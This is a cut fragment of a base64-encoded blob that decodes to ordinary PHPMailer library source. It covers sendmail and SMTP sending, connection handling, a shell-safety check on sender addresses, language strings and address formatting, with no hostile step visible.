N1bHQgIT0gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICghQCRtYWlsID0gcG9wZW4oJHNlbmRtYWlsLCAndycpKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkaGVhZGVyKTsNCiAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7DQogICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsNCiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCgkcmVzdWx0ID09IDApLCAkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgICAgICBpZiAoJHJlc3VsdCAhPSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1NoZWxsU2FmZSgkc3RyaW5nKSB7DQogICAgICAgIGlmIChAZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcgb3IgIWluX2FycmF5KEBlc2NhcGVzaGVsbGFyZygkc3RyaW5nKSwgYXJyYXkoDQogICAgICAgICAgICAiJyRzdHJpbmcnIiwNCiAgICAgICAgICAgICJcIiRzdHJpbmdcIiINCiAgICAgICAgKSkpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkbGVuZ3RoID0gc3RybGVuKCRzdHJpbmcpOw0KICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7DQogICAgICAgICAgICAkYyA9ICRzdHJpbmdbJGldOw0KICAgICAgICAgICAgaWYgKCFjdHlwZV9hbG51bSgkYykgJiYgc3RycG9zKCdAXy0uJywgJGMpID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIG1haWxTZW5kKCRoZWFkZXIsICRib2R5KSB7DQogICAgICAgICR0b0FyciA9IGFycmF5KCk7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG9hZGRyKSB7DQogICAgICAgICAgICAkdG9BcnJbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOw0KICAgICAgICB9DQogICAgICAgICR0byAgICAgPSBpbXBsb2RlKCcsICcsICR0b0Fycik7DQogICAgICAgICRwYXJhbXMgPSBudWxsOw0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICBpZiAoc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICAgICAkcGFyYW1zID0gc3ByaW50ZignLWYlcycsICR0aGlzLT5TZW5kZXIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kICFpbmlfZ2V0KCdzYWZlX21vZGUnKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgJG9sZF9mcm9tID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOw0KICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR0aGlzLT5TZW5kZXIpOw0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgPSBmYWxzZTsNCiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbyBhbmQgY291bnQoJHRvQXJyKSA+IDEpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCR0b0FyciBhcyAkdG9BZGRyKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvQWRkciwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJHRvQWRkcg0KICAgICAgICAgICAgICAgICksICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG8sICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCAkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzc2V0KCRvbGRfZnJvbSkpIHsNCiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkb2xkX2Zyb20pOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHJlc3VsdCkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnaW5zdGFudGlhdGUnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTTVRQSW5zdGFuY2UoKSB7DQogICAgICAgIGlmICghaXNfb2JqZWN0KCR0aGlzLT5zbXRwKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNtdHAgICAgICAgICAgICA9IG5ldyBTTVRQOw0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPlVzZVNvY2tzICA9ICR0aGlzLT5Vc2VTb2NrczsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5Tb2Nrc0hvc3QgPSAkdGhpcy0+U29ja3NIb3N0Ow0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPlNvY2tzUG9ydCA9ICR0aGlzLT5Tb2Nrc1BvcnQ7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc210cFNlbmQoJGhlYWRlciwgJGJvZHkpIHsNCiAgICAgICAgJGJhZF9yY3B0ID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKCEkdGhpcy0+c210cENvbm5lY3QoJHRoaXMtPlNNVFBPcHRpb25zKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc210cF9jb25uZWN0X2ZhaWxlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5tYWlsKCRzbXRwX2Zyb20pKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsNCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPkVycm9ySW5mbywgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoYXJyYXkoDQogICAgICAgICAgICAkdGhpcy0+dG8sDQogICAgICAgICAgICAkdGhpcy0+Y2MsDQogICAgICAgICAgICAkdGhpcy0+YmNjDQogICAgICAgICkgYXMgJHRvZ3JvdXApIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCR0b2dyb3VwIGFzICR0bykgew0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPnJlY2lwaWVudCgkdG9bMF0pKSB7DQogICAgICAgICAgICAgICAgICAgICRlcnJvciAgICAgID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICAgICAgICAgICRiYWRfcmNwdFtdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAndG8nID0+ICR0b1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICdlcnJvcicgPT4gJGVycm9yWydkZXRhaWwnXQ0KICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICAkaXNTZW50ICAgICA9IGZhbHNlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkaXNTZW50LCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJHRvWzBdDQogICAgICAgICAgICAgICAgKSwgYXJyYXkoKSwgYXJyYXkoKSwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+YWxsX3JlY2lwaWVudHMpID4gY291bnQoJGJhZF9yY3B0KSkgYW5kICEkdGhpcy0+c210cC0+ZGF0YSgkaGVhZGVyIC4gJGJvZHkpKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdkYXRhX25vdF9hY2NlcHRlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5yZXNldCgpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChjb3VudCgkYmFkX3JjcHQpID4gMCkgew0KICAgICAgICAgICAgJGVycnN0ciA9ICcnOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGJhZF9yY3B0IGFzICRiYWQpIHsNCiAgICAgICAgICAgICAgICAkZXJyc3RyIC49ICRiYWRbJ3RvJ10gLiAnOiAnIC4gJGJhZFsnZXJyb3InXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3JlY2lwaWVudHNfZmFpbGVkJykgLiAkZXJyc3RyLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDb25uZWN0KCRvcHRpb25zID0gbnVsbCkgew0KICAgICAgICBpZiAoaXNfbnVsbCgkdGhpcy0+c210cCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwID0gJHRoaXMtPmdldFNNVFBJbnN0YW5jZSgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc19udWxsKCRvcHRpb25zKSkgew0KICAgICAgICAgICAgJG9wdGlvbnMgPSAkdGhpcy0+U01UUE9wdGlvbnM7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFRpbWVvdXQoJHRoaXMtPlRpbWVvdXQpOw0KICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdMZXZlbCgkdGhpcy0+U01UUERlYnVnKTsNCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnT3V0cHV0KCR0aGlzLT5EZWJ1Z291dHB1dCk7DQogICAgICAgICR0aGlzLT5zbXRwLT5zZXRWZXJwKCR0aGlzLT5kb192ZXJwKTsNCiAgICAgICAgJGhvc3RzICAgICAgICAgPSBleHBsb2RlKCc7JywgJHRoaXMtPkhvc3QpOw0KICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9IG51bGw7DQogICAgICAgIGZvcmVhY2ggKCRob3N0cyBhcyAkaG9zdGVudHJ5KSB7DQogICAgICAgICAgICAkaG9zdGluZm8gPSBhcnJheSgpOw0KICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvXigoc3NsfHRscyk6XC9cLykqKFthLXpBLVowLTlcLi1dKik6PyhbMC05XSopJC8nLCB0cmltKCRob3N0ZW50cnkpLCAkaG9zdGluZm8pKSB7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkcHJlZml4ID0gJyc7DQogICAgICAgICAgICAkc2VjdXJlID0gJHRoaXMtPlNNVFBTZWN1cmU7DQogICAgICAgICAgICAkdGxzICAgID0gKCR0aGlzLT5TTVRQU2VjdXJlID09ICd0bHMnKTsNCiAgICAgICAgICAgIGlmICgnc3NsJyA9PSAkaG9zdGluZm9bMl0gb3IgKCcnID09ICRob3N0aW5mb1syXSBhbmQgJ3NzbCcgPT0gJHRoaXMtPlNNVFBTZWN1cmUpKSB7DQogICAgICAgICAgICAgICAgJHByZWZpeCA9ICdzc2w6Ly8nOw0KICAgICAgICAgICAgICAgICR0bHMgICAgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAkc2VjdXJlID0gJ3NzbCc7DQogICAgICAgICAgICB9IGVsc2VpZiAoJGhvc3RpbmZvWzJdID09ICd0bHMnKSB7DQogICAgICAgICAgICAgICAgJHRscyAgICA9IHRydWU7DQogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICd0bHMnOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHNzbGV4dCA9IGRlZmluZWQoJ09QRU5TU0xfQUxHT19TSEExJyk7DQogICAgICAgICAgICBpZiAoJ3RscycgPT09ICRzZWN1cmUgb3IgJ3NzbCcgPT09ICRzZWN1cmUpIHsNCiAgICAgICAgICAgICAgICBpZiAoISRzc2xleHQpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJywgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGhvc3QgID0gJGhvc3RpbmZvWzNdOw0KICAgICAgICAgICAgJHBvcnQgID0gJHRoaXMtPlBvcnQ7DQogICAgICAgICAgICAkdHBvcnQgPSAoaW50ZWdlcikgJGhvc3RpbmZvWzRdOw0KICAgICAgICAgICAgaWYgKCR0cG9ydCA+IDAgYW5kICR0cG9ydCA8IDY1NTM2KSB7DQogICAgICAgICAgICAgICAgJHBvcnQgPSAkdHBvcnQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3QoJHByZWZpeCAuICRob3N0LCAkcG9ydCwgJHRoaXMtPlRpbWVvdXQsICRvcHRpb25zKSkgew0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+SGVsbykgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPkhlbG87DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+c2VydmVySG9zdG5hbWUoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TTVRQQXV0b1RMUyBhbmQgJHNzbGV4dCBhbmQgJHNlY3VyZSAhPSAnc3NsJyBhbmQgJHRoaXMtPnNtdHAtPmdldFNlcnZlckV4dCgnU1RBUlRUTFMnKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHRscyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0bHMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPnN0YXJ0VExTKCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdjb25uZWN0X2hvc3QnKSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRoKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5hdXRoZW50aWNhdGUoJHRoaXMtPlVzZXJuYW1lLCAkdGhpcy0+UGFzc3dvcmQsICR0aGlzLT5BdXRoVHlwZSwgJHRoaXMtPlJlYWxtLCAkdGhpcy0+V29ya3N0YXRpb24pKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnYXV0aGVudGljYXRlJykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICAgICAgICAgJGxhc3RleGNlcHRpb24gPSAkZXhjOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMgYW5kICFpc19udWxsKCRsYXN0ZXhjZXB0aW9uKSkgew0KICAgICAgICAgICAgdGhyb3cgJGxhc3RleGNlcHRpb247DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENsb3NlKCkgew0KICAgICAgICBpZiAoaXNfYSgkdGhpcy0+c210cCwgJ1NNVFAnKSkgew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldExhbmd1YWdlKCRsYW5nY29kZSA9ICdlbicsICRsYW5nX3BhdGggPSAnJykgew0KICAgICAgICAkcmVuYW1lZF9sYW5nY29kZXMgPSBhcnJheSgNCiAgICAgICAgICAgICdicicgPT4gJ3B0X2JyJywNCiAgICAgICAgICAgICdjeicgPT4gJ2NzJywNCiAgICAgICAgICAgICdkaycgPT4gJ2RhJywNCiAgICAgICAgICAgICdubycgPT4gJ25iJywNCiAgICAgICAgICAgICdzZScgPT4gJ3N2Jw0KICAgICAgICApOw0KICAgICAgICBpZiAoaXNzZXQoJHJlbmFtZWRfbGFuZ2NvZGVzWyRsYW5nY29kZV0pKSB7DQogICAgICAgICAgICAkbGFuZ2NvZGUgPSAkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXTsNCiAgICAgICAgfQ0KICAgICAgICAkUEhQTUFJTEVSX0xBTkcgPSBhcnJheSgNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGUnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgYXV0aGVudGljYXRlLicsDQogICAgICAgICAgICAnY29ubmVjdF9ob3N0JyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGNvbm5lY3QgdG8gU01UUCBob3N0LicsDQogICAgICAgICAgICAnZGF0YV9ub3RfYWNjZXB0ZWQnID0+ICdTTVRQIEVycm9yOiBkYXRhIG5vdCBhY2NlcHRlZC4nLA0KICAgICAgICAgICAgJ2VtcHR5X21lc3NhZ2UnID0+ICdNZXNzYWdlIGJvZHkgZW1wdHknLA0KICAgICAgICAgICAgJ2VuY29kaW5nJyA9PiAnVW5rbm93biBlbmNvZGluZzogJywNCiAgICAgICAgICAgICdleGVjdXRlJyA9PiAnQ291bGQgbm90IGV4ZWN1dGU6ICcsDQogICAgICAgICAgICAnZmlsZV9hY2Nlc3MnID0+ICdDb3VsZCBub3QgYWNjZXNzIGZpbGU6ICcsDQogICAgICAgICAgICAnZmlsZV9vcGVuJyA9PiAnRmlsZSBFcnJvcjogQ291bGQgbm90IG9wZW4gZmlsZTogJywNCiAgICAgICAgICAgICdmcm9tX2ZhaWxlZCcgPT4gJ1RoZSBmb2xsb3dpbmcgRnJvbSBhZGRyZXNzIGZhaWxlZDogJywNCiAgICAgICAgICAgICdpbnN0YW50aWF0ZScgPT4gJ01BSUxfRElTQUJMRUQnLA0KICAgICAgICAgICAgJ2ludmFsaWRfYWRkcmVzcycgPT4gJ0ludmFsaWQgYWRkcmVzczogJywNCiAgICAgICAgICAgICdtYWlsZXJfbm90X3N1cHBvcnRlZCcgPT4gJyBtYWlsZXIgaXMgbm90IHN1cHBvcnRlZC4nLA0KICAgICAgICAgICAgJ3Byb3ZpZGVfYWRkcmVzcycgPT4gJ1lvdSBtdXN0IHByb3ZpZGUgYXQgbGVhc3Qgb25lIHJlY2lwaWVudCBlbWFpbCBhZGRyZXNzLicsDQogICAgICAgICAgICAncmVjaXBpZW50c19mYWlsZWQnID0+ICdTTVRQIEVycm9yOiBUaGUgZm9sbG93aW5nIHJlY2lwaWVudHMgZmFpbGVkOiAnLA0KICAgICAgICAgICAgJ3NpZ25pbmcnID0+ICdTaWduaW5nIEVycm9yOiAnLA0KICAgICAgICAgICAgJ3NtdHBfY29ubmVjdF9mYWlsZWQnID0+ICdTTVRQIGNvbm5lY3QoKSBmYWlsZWQuJywNCiAgICAgICAgICAgICdzbXRwX2Vycm9yJyA9PiAnU01UUCBzZXJ2ZXIgZXJyb3I6ICcsDQogICAgICAgICAgICAndmFyaWFibGVfc2V0JyA9PiAnQ2Fubm90IHNldCBvciByZXNldCB2YXJpYWJsZTogJywNCiAgICAgICAgICAgICdleHRlbnNpb25fbWlzc2luZycgPT4gJ0V4dGVuc2lvbiBtaXNzaW5nOiAnDQogICAgICAgICk7DQogICAgICAgIGlmIChlbXB0eSgkbGFuZ19wYXRoKSkgew0KICAgICAgICAgICAgJGxhbmdfcGF0aCA9IGRpcm5hbWUoX19GSUxFX18pIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdsYW5ndWFnZScgLiBESVJFQ1RPUllfU0VQQVJBVE9SOw0KICAgICAgICB9DQogICAgICAgIGlmICghcHJlZ19tYXRjaCgnL15bYS16XXsyfSg/Ol9bYS16QS1aXXsyfSk/JC8nLCAkbGFuZ2NvZGUpKSB7DQogICAgICAgICAgICAkbGFuZ2NvZGUgPSAnZW4nOw0KICAgICAgICB9DQogICAgICAgICRmb3VuZGxhbmcgPSB0cnVlOw0KICAgICAgICAkbGFuZ19maWxlID0gJGxhbmdfcGF0aCAuICdwaHBtYWlsZXIubGFuZy0nIC4gJGxhbmdjb2RlIC4gJy5waHAnOw0KICAgICAgICBpZiAoJGxhbmdjb2RlICE9ICdlbicpIHsNCiAgICAgICAgICAgIGlmICghaXNfcmVhZGFibGUoJGxhbmdfZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gZmFsc2U7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBpbmNsdWRlICRsYW5nX2ZpbGU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmxhbmd1YWdlID0gJFBIUE1BSUxFUl9MQU5HOw0KICAgICAgICByZXR1cm4gKGJvb2xlYW4pICRmb3VuZGxhbmc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUcmFuc2xhdGlvbnMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRyQXBwZW5kKCR0eXBlLCAkYWRkcikgew0KICAgICAgICAkYWRkcmVzc2VzID0gYXJyYXkoKTsNCiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCRhZGRyZXNzKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHR5cGUgLiAnOiAnIC4gaW1wbG9kZSgnLCAnLCAkYWRkcmVzc2VzKSAuICR0aGlzLT5MRTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZHJGb3JtYXQoJGFkZHIpIHsNCiAgICAgICAgaWYgKGVtcHR5KCRhZGRyWzFdKSkgew0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclsxXSksICdwaHJhc2UnKSAuICcgPCcgLiAkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzBdKSAuICc+JzsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gd3JhcFRleHQoJG1lc3NhZ2UsICRsZW5ndGgsICRxcF9tb2RlID0gZmFsc2UpIHsNCiAgICAgICAgaWYgKCRxcF9tb2RlKSB7DQogICAgICAgICAgICAkc29mdF9icmVhayA9IHNwcmludGYoJyA9JXMnLCAkdGhpcy0+TEUpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHNvZnRfYnJlYWsgPSAkdGhpcy0+TEU7DQogICAgICAgIH0NCiAgICAgICAgJGlzX3V0ZjggPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gJ3V0Zi04Jyk7DQogICAgICAgICRsZWxlbiAgID0gc3RybGVuKCR0aGlzLT5MRSk7DQogICAgICAgICRjcmxmbGVuID0gc3RybGVuKHNlbGY6OkNSTEYpOw0KICAgICAgICAkbWVzc2FnZSA9ICR0aGlzLT5maXhFT0woJG1lc3NhZ2UpOw0KICAgICAgICBpZiAoc3Vic3RyKCRtZXNzYWdlLCAtJGxlbGVuKSA9PSAkdGhpcy0+TEUpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gc3Vic3RyKCRtZXNzYWdlLCAwLCAtJGxlbGVuKTsNCiAgICAgICAgfQ0KICAgICAgICAkbGluZXMgICA9IGV4cGxv